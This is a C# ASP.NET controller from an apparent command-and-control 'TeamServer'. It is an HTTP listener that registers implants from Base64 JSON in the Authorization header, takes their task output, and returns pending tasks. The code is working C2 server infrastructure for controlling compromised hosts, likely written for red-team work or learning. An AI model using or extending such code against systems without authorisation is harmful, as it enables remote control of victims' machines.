using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;

using Newtonsoft.Json;

using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Threading.Tasks;
using TeamServer.Models;
using TeamServer.Services;

namespace TeamServer.Controllers
{
    [Controller]
    public class HTTPListenerController : ControllerBase
    {
        private readonly IImplantService _implants;

        public HTTPListenerController(IImplantService implants) { _implants = implants; }

        public async Task<IActionResult> HandleImplant(){
            var implantData = DataExtract(HttpContext.Request.Headers);
            if(implantData is null) { return NotFound(); }

            var implant = _implants.GetImplant(implantData.ID);

            if (implant is null){
                implant = new Implant(implantData);
                _implants.AddImplant(implant);
            }

            implant.PollImplant();

            //System.Threading.Thread.Sleep(Jitter);

            if(HttpContext.Request.Method == "POST") {
                string respBody;

                using (var stream = new StreamReader(HttpContext.Request.Body)) { respBody = await stream.ReadToEndAsync(); }

                var _out = JsonConvert.DeserializeObject<IEnumerable<ImplantTaskOut>>(respBody);
                implant.AddTaskOut(_out);
            }

            var tasks = implant.GetPendingTasks();
            return Ok(tasks);
        }

        public ImplantData DataExtract(IHeaderDictionary headers){
            if (!headers.TryGetValue("Authorization", out var encData)) { return null; }

            encData = encData.ToString().Remove(0, 7);

            var jsonData = Encoding.UTF8.GetString(Convert.FromBase64String(encData));
            return JsonConvert.DeserializeObject<ImplantData>(jsonData);
        }
    }
}
